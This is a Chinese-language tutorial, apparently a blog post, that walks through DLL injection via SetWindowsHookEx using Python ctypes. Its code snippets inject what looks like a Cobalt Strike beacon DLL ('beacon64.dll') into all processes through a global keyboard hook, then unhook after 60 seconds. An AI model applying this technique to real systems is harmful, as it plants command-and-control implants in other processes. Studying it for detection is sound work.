什么是钩子


Hook钩子是win系统消息处理的一个平台，可以在上面设置子进程来监视指定窗口的某种消息，而且所监视的窗口可以是其他进程创建的（说明可以跨进程），它能优先于目标窗口处理函数之前处理消息， 这时钩子函数即可以加工处理（改变）该消息，也可以不作处理而继续传递该消息，还可以强制结束消息的传递。


消息钩子注入


SetWindowsHookEx函数是微软提供给程序开发人员进行消息拦截的一个API ，看下面官方介绍可以进行dll注入的，实现原理是将一个动态链接库(dll)的函数注入到线程中执行。

本文通过py2.7使用ctypes库进行DLL注入实现，解读一下消息钩子DLL注入的原理。


函数了解


GetModuleHandle

该函数来获取指定模块的模块句柄,但该模块必须已由调用进程加载。

函数原型：

https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlew
HMODULE GetModuleHandleW(  LPCWSTR lpModuleName);

成功则返回dll句柄，失败则为空。

lpModuleName则是想要获取句柄的文件名（dll或exe文件）


想用这函数获得Dll句柄，要么该DLL已经被某程序加载了，要么我们用LoadLibrary在本程序加载一下

DllModule = ctypes.windll.LoadLibrary("C:\\Users\\lcg17\\Desktop\\cs\\beacon64.dll")

然后GetModuleHandle获取句柄即可

ctypes.windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]ctypes.windll.kernel32.GetModuleHandleW.restype = c_void_pm_handle = ctypes.windll.kernel32.GetModuleHandleW("C:\\Users\\lcg17\\Desktop\\cs\\beacon64.dll")


SetWindowsHookEx

SetWindowsHookEx来设置消息钩子，可以将我们定义的挂钩安装到特定程序的挂钩链中，这个挂钩我们可以设置为触发某个动作，当我们设定监视某个进程某个行为(比如敲击键盘)，会触发动作，从而将该动作的dll文件加载到这个进程，实现注入。

函数除了可以设置当前进程的钩子之外，它还可以设置全局钩子 ，该API定义在User32.dll中。

函数原型：

https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa
HHOOK SetWindowsHookExA(  int       idHook,  HOOKPROC  lpfn,  HINSTANCE hmod,  DWORD     dwThreadId);

对应参数

调用成功返回一个HHOOK钩子的句柄，失败返回Null


idHook是钩子类型，不同钩子类型需要触发相应动作才能将DLL注入，类型很多可以去函数原型处自己查看，有敲击键盘，关闭窗口等等。

WH_KEYBOARD = 2WH_KEYBOARD_LL =13

lpfn是根据钩子类型调用不同的回调函数，我们将想注入的DLL文件内的函数当做该回调函数

这里我想调用beacon.dll的DllMain函数作为回调函数，先使用GetProcAddress获取DllMain函数内存地址

ctypes.windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]ctypes.windll.kernel32.GetProcAddress.restype = c_void_pD_Address = ctypes.windll.kernel32.GetProcAddress(m_handle, b'DllMain')

使用ctypes库的WINFUNCTYPE设置我们回调函数格式

HOOKPROC = WINFUNCTYPE(c_long, c_int, WPARAM, LPARAM)pointer = HOOKPROC(D_Address)

hmod设置dll句柄，就是我们beacon.dll文件的句柄

dwThreadId设置线程tid，可以注入到特定线程，也可以设置为0注入成为全局钩子， 即当前正在运行的进程都会被设置相应的钩子。

ctypes.windll.user32.SetWindowsHookExA.regtypes = c_int,LPVOID,LPVOID,DWORDctypes.windll.user32.SetWindowsHookExA.restype = HHOOKhooked = ctypes.windll.user32.SetWindowsHookExA(WH_KEYBOARD_LL,D_Address,DllModule,0)



UnhookWindowsHookEx

此函数取消我们设置的钩子，当我们注入成功就赶紧撤销钩子防止影响系统运行

函数原型：

https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-unhookwindowshookex
BOOL UnhookWindowsHookEx(  HHOOK hhk);

使用time设置60秒睡眠，在这60秒内触发事件，结束后立即取消钩子

import timetime sleep(60)ctypes.windll.user32.UnhookWindowsHookEx(hooked)
